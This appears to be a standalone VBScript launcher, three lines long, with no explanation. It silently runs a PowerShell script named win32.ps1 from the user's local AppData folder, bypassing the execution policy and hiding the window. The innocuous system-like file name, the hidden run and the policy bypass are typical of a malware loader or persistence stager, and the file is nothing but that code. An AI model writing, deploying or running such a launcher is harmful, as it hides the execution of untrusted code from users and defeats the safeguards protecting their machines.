Set objShell = CreateObject("WScript.Shell")
command = "powershell -ExecutionPolicy Bypass -File ""%LOCALAPPDATA%\win32.ps1"""
objShell.Run command, 0, False
